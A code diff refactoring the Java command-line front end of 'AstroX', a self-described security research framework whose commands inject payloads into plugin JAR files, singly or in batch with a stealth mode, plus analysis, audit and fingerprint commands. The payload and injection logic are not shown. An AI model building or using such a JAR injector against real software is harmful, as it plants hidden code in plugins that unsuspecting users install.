@@ -14,6 +14,7 @@ import java.io.*;
 import java.util.List;
 import java.util.Optional;
 import java.util.Properties;
+import java.util.concurrent.Callable;
 
 /**
  * AstroX CLI — Professional Security Research Framework.
@@ -33,7 +34,7 @@ import java.util.Properties;
                 CommandLine.HelpCommand.class
         }
 )
-public class AstroX implements Runnable {
+public class AstroX implements Callable<Integer> {
 
     private static final Logger LOG = LoggerFactory.getLogger(AstroX.class);
 
@@ -63,16 +64,17 @@ public class AstroX implements Runnable {
     }
 
     @Override
-    public void run() {
+    public Integer call() {
         // No subcommand specified — print usage
         new CommandLine(this).usage(System.out);
+        return 0;
     }
 
     // ==================== INJECT Subcommand ====================
 
     @Command(name = "inject", description = "Inject payload into a single plugin JAR",
             mixinStandardHelpOptions = true)
-    static class InjectCommand implements Runnable {
+    static class InjectCommand implements Callable<Integer> {
 
         @Parameters(index = "0", description = "Target plugin JAR file")
         File inputFile;
@@ -110,7 +112,7 @@ public class AstroX implements Runnable {
         boolean debug;
 
         @Override
-        public void run() {
+        public Integer call() {
             try {
                 // Set master key
                 Config.setMasterKey(masterKey);
@@ -183,8 +185,9 @@ public class AstroX implements Runnable {
                 if (debug) {
                     LOG.error("Stack trace:", e);
                 }
-                System.exit(1);
+                return 1;
             }
+            return 0;
         }
 
         private void applyConfig() {
@@ -243,7 +246,7 @@ public class AstroX implements Runnable {
 
     @Command(name = "batch", description = "Inject into all JARs in a directory concurrently",
             mixinStandardHelpOptions = true)
-    static class BatchCommand implements Runnable {
+    static class BatchCommand implements Callable<Integer> {
 
         @Option(names = {"--target-dir", "-d"}, required = true,
                 description = "Directory containing target JARs")
@@ -267,7 +270,7 @@ public class AstroX implements Runnable {
         File reportFile;
 
         @Override
-        public void run() {
+        public Integer call() {
             try {
                 Config.setMasterKey(masterKey);
                 RuntimeConfig.stealthMode = stealth;
@@ -275,7 +278,7 @@ public class AstroX implements Runnable {
 
                 if (!targetDir.isDirectory()) {
                     LOG.error("Not a directory: {}", targetDir);
-                    System.exit(1);
+                    return 1;
                 }
 
                 BatchProcessor processor = new BatchProcessor(
@@ -292,8 +295,9 @@ public class AstroX implements Runnable {
 
             } catch (Exception e) {
                 LOG.error("Batch processing failed: {}", e.getMessage(), e);
-                System.exit(1);
+                return 1;
             }
+            return 0;
         }
     }
 
@@ -301,13 +305,13 @@ public class AstroX implements Runnable {
 
     @Command(name = "analyze", description = "Analyze a plugin JAR without injecting",
             mixinStandardHelpOptions = true)
-    static class AnalyzeCommand implements Runnable {
+    static class AnalyzeCommand implements Callable<Integer> {
 
         @Parameters(index = "0", description = "Target plugin JAR file")
         File inputFile;
 
         @Override
-        public void run() {
+        public Integer call() {
             try {
                 validateInput(inputFile);
 
@@ -329,8 +333,9 @@ public class AstroX implements Runnable {
 
             } catch (Exception e) {
                 LOG.error("Analysis failed: {}", e.getMessage());
-                System.exit(1);
+                return 1;
             }
+            return 0;
         }
     }
 
@@ -338,14 +343,14 @@ public class AstroX implements Runnable {
 
     @Command(name = "verify-audit", description = "Verify integrity of the injection audit log",
             mixinStandardHelpOptions = true)
-    static class VerifyAuditCommand implements Runnable {
+    static class VerifyAuditCommand implements Callable<Integer> {
 
         @Option(names = {"--key", "-k"}, required = true,
                 description = "Master key used during injections")
         String masterKey;
 
         @Override
-        public void run() {
+        public Integer call() {
             AuditLogger audit = new AuditLogger(masterKey);
             AuditLogger.VerificationResult result = audit.verifyAll();
 
@@ -362,8 +367,9 @@ public class AstroX implements Runnable {
                 for (String error : result.errors()) {
                     LOG.error("  ✗ {}", error);
                 }
-                System.exit(1);
+                return 1;
             }
+            return 0;
         }
     }
 
@@ -371,7 +377,7 @@ public class AstroX implements Runnable {
 
     @Command(name = "fingerprint", description = "Manage the plugin fingerprint database",
             mixinStandardHelpOptions = true)
-    static class FingerprintCommand implements Runnable {
+    static class FingerprintCommand implements Callable<Integer> {
 
         @Option(names = "--add", description = "Add a JAR to the fingerprint database")
         File addFile;
@@ -389,7 +395,7 @@ public class AstroX implements Runnable {
         File checkFile;
 
         @Override
-        public void run() {
+        public Integer call() {
             PluginFingerprinter fp = new PluginFingerprinter();
 
             if (list) {
@@ -398,7 +404,7 @@ public class AstroX implements Runnable {
                         LOG.info("  {} v{} — {} fingerprints ({})",
                                 value.name(), value.version(),
                                 value.fingerprints().size(), value.source()));
-                return;
+                return 0;
             }
 
             if (addFile != null) {
@@ -409,7 +415,7 @@ public class AstroX implements Runnable {
                 } catch (Exception e) {
                     LOG.error("Failed to add fingerprint: {}", e.getMessage());
                 }
-                return;
+                return 0;
             }
 
             if (checkFile != null) {
@@ -420,10 +426,11 @@ public class AstroX implements Runnable {
                 } else {
                     LOG.info("✓ No known fingerprint match for {}", checkFile.getName());
                 }
-                return;
+                return 0;
             }
 
             new CommandLine(this).usage(System.out);
+            return 0;
         }
     }
 
@@ -473,7 +480,7 @@ public class AstroX implements Runnable {
                 return new String[]{
                         "AstroX v" + props.getProperty("astrox.version", "2.0.0")
                 };
-            } catch (Exception e) {
+            } catch (IOException e) {
                 return new String[]{"AstroX v2.0.0"};
             }
         }
